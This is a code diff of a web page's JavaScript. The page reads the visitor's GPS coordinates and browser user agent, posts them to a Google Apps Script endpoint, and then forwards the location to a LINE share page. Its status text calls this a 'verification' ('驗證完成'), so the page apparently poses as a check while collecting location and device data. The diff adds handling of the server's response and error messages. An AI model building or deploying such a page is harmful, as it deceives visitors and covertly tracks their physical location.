@@ -31,7 +31,6 @@
 
                 const userAgent = navigator.userAgent;
 
-                // 取得定位
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(async function(position) {
                         const lat = position.coords.latitude;
@@ -39,8 +38,8 @@
                         const mapLink = `https://maps.google.com/?q=${lat},${lon}`;
                         const text = `這是我的位置：\n${mapLink}`;
 
-                        // 發送到 GAS
-                        await fetch(GAS_URL, {
+                        // 發送資料到 GAS
+                        const response = await fetch(GAS_URL, {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({
@@ -52,11 +51,17 @@
                             })
                         });
 
-                        document.getElementById("status").innerText = "驗證完成，請稍候...";
-                        setTimeout(() => {
-                            // 開啟 LINE 傳送頁面
-                            window.location.href = `https://line.me/R/msg/text/?${encodeURIComponent(text)}`;
-                        }, 1500);
+                        const result = await response.text();
+                        console.log("伺服器回應：", result);
+                        document.getElementById("status").innerText = "伺服器回應：" + result;
+
+                        if (result === "OK") {
+                            setTimeout(() => {
+                                window.location.href = `https://line.me/R/msg/text/?${encodeURIComponent(text)}`;
+                            }, 1500);
+                        } else {
+                            btn.disabled = false;
+                        }
 
                     }, function(error) {
                         document.getElementById("status").innerText = "定位失敗，請允許位置存取。";
@@ -67,7 +72,7 @@
                     btn.disabled = false;
                 }
             } catch (e) {
-                document.getElementById("status").innerText = "系統錯誤，請稍後再試。";
+                document.getElementById("status").innerText = "系統錯誤：" + e.message;
                 btn.disabled = false;
             }
         }
